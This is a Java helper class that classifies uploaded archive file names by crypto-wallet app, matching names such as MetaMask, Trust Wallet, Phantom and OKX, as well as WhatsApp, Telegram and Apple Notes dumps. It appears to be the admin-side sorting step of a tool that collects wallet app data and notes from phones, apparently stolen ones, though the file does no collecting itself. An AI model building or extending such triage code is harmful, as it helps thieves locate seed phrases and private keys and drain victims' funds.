package com.admin.parse;

import java.nio.file.Path;
import java.util.Locale;
import java.util.regex.Pattern;

import org.apache.commons.lang3.StringUtils;

public final class WalletMatcher {

    private static final String[][] HINTS = {
            {"metamask", "MetaMask", "metamask"},
            {"im.token", "imToken", "imtoken"},
            {"imtoken", "imToken", "imtoken"},
            {"tronlink", "TronLink", "tronlink"},
            {"tonhub", "Tonhub", "tonhub"},
            {"tonkeeper", "Tonkeeper", "tonkeeper"},
            {"mytonwallet", "MyTonWallet", "mytonwallet"},
            {"phantom", "Phantom", "phantom"},
            {"sixdays.trust", "Trust Wallet", "trust"},
            {"trust", "Trust Wallet", "trust"},
            {"tokenpocket", "TokenPocket", "tokenpocket"},
            {"exodus", "Exodus", "exodus"},
            {"coin98", "Coin98", "coin98"},
            {"bitpie", "Bitpie", "bitpie"},
            {"bitkeep", "Bitget Wallet", "bitkeep"},
            {"uniswap", "Uniswap", "uniswap"},
            {"okex", "OKX", "okx"},
            {"okx", "OKX", "okx"},
            {"solflare", "Solflare", "solflare"},
            {"toshi", "Base App", "coinbase"},
            {"global.wallet", "Global Wallet", "globalwallet"},
            {"digitalshield", "DigitalShield", "digitalshield"},
            {"so.onekey", "OneKey", "onekey"},
            {"onekey", "OneKey", "onekey"},
            {"whatsapp", "WhatsApp", "whatsapp"},
            {"telegram", "Telegram", "telegram"},
            {"telegra", "Telegram", "telegram"},
    };

    private WalletMatcher() {
    }

    public static boolean isNotesArchiveName(String fileName) {
        String name = Path.of(StringUtils.defaultString(fileName)).getFileName().toString().toLowerCase(Locale.ROOT);
        if (name.isEmpty()) {
            return false;
        }
        if (name.contains("mobilenotes") || name.contains("com.apple.mobilenotes")) {
            return true;
        }
        if (name.contains("group.com.apple.notes") || name.contains("com.apple.notes")) {
            return true;
        }
        return name.equals("notes.tar") || name.equals("notes.zip") || name.equals("notes.tar.gz")
                || name.equals("notes.tgz") || (name.startsWith("notes.") && isArchive(name));
    }

    public static boolean isCoreExportName(String fileName) {
        String name = Path.of(StringUtils.defaultString(fileName)).getFileName().toString().toLowerCase(Locale.ROOT);
        return name.startsWith("core_export_") && isArchive(name);
    }

    public static boolean isArchive(String fileName) {
        String lower = StringUtils.defaultString(fileName).toLowerCase(Locale.ROOT);
        return lower.endsWith(".tar") || lower.endsWith(".tar.gz") || lower.endsWith(".tgz") || lower.endsWith(".zip");
    }

    /**
     * uniqueDest 撞名时写成 stem_{uploadId前8位}.ext，例如
     * app.phantom.tar 与 app.phantom_ac50965d.tar 是同一钱包的两份落盘。
     */
    private static final Pattern COLLISION_STEM = Pattern.compile(".*_[0-9a-fA-F]{8}");

    public static String canonicalArchiveName(String fileName) {
        String name = Path.of(StringUtils.defaultString(fileName)).getFileName().toString();
        int dot = name.lastIndexOf('.');
        if (dot <= 0) {
            return name;
        }
        String stem = name.substring(0, dot);
        String ext = name.substring(dot);
        if (COLLISION_STEM.matcher(stem).matches() && stem.length() > 9 && stem.charAt(stem.length() - 9) == '_') {
            return stem.substring(0, stem.length() - 9) + ext;
        }
        return name;
    }

    public static boolean isCollisionCopy(String fileName) {
        String name = Path.of(StringUtils.defaultString(fileName)).getFileName().toString();
        return !name.equals(canonicalArchiveName(name));
    }

    public static int preferOriginalArchive(String a, String b) {
        boolean ac = isCollisionCopy(a);
        boolean bc = isCollisionCopy(b);
        if (ac != bc) {
            return ac ? 1 : -1;
        }
        return StringUtils.defaultString(a).compareToIgnoreCase(StringUtils.defaultString(b));
    }

    /** 返回 [title, walletKey]，无法识别返回 null。 */
    public static String[] matchWallet(String fileName) {
        if (StringUtils.isBlank(fileName)) {
            return null;
        }
        if (isNotesArchiveName(fileName)) {
            return new String[] {"备忘录", "notes"};
        }
        String lower = fileName.toLowerCase(Locale.ROOT);
        for (String[] h : HINTS) {
            if (lower.contains(h[0])) {
                return new String[] {h[1], h[2]};
            }
        }
        return null;
    }

    public static String[] matchWalletOrArchive(String fileName) {
        String[] matched = matchWallet(fileName);
        if (matched != null) {
            return matched;
        }
        String lower = StringUtils.defaultString(fileName).toLowerCase(Locale.ROOT);
        if (!isArchive(lower)) {
            return null;
        }
        String stem = Path.of(fileName).getFileName().toString();
        for (String ext : new String[] {".tar.gz", ".tar", ".tgz", ".zip"}) {
            if (stem.toLowerCase(Locale.ROOT).endsWith(ext)) {
                stem = stem.substring(0, stem.length() - ext.length());
                break;
            }
        }
        String title = stem.contains(".") ? stem.substring(stem.lastIndexOf('.') + 1) : stem;
        return new String[] {title.isEmpty() ? stem : title, "generic"};
    }

    public static String walletTitle(String walletKey) {
        if ("notes".equals(walletKey)) {
            return "备忘录";
        }
        for (String[] h : HINTS) {
            if (h[2].equals(walletKey)) {
                return h[1];
            }
        }
        return StringUtils.defaultIfBlank(walletKey, "钱包");
    }

    public static String classifyV2(String fileName) {
        if (isCoreExportName(fileName)) {
            return null;
        }
        String[] matched = matchWallet(fileName);
        if (matched == null || "generic".equals(matched[1])) {
            return null;
        }
        String wkey = matched[1];
        if ("digitalshield".equals(wkey)) {
            return "onekey";
        }
        return wkey;
    }
}
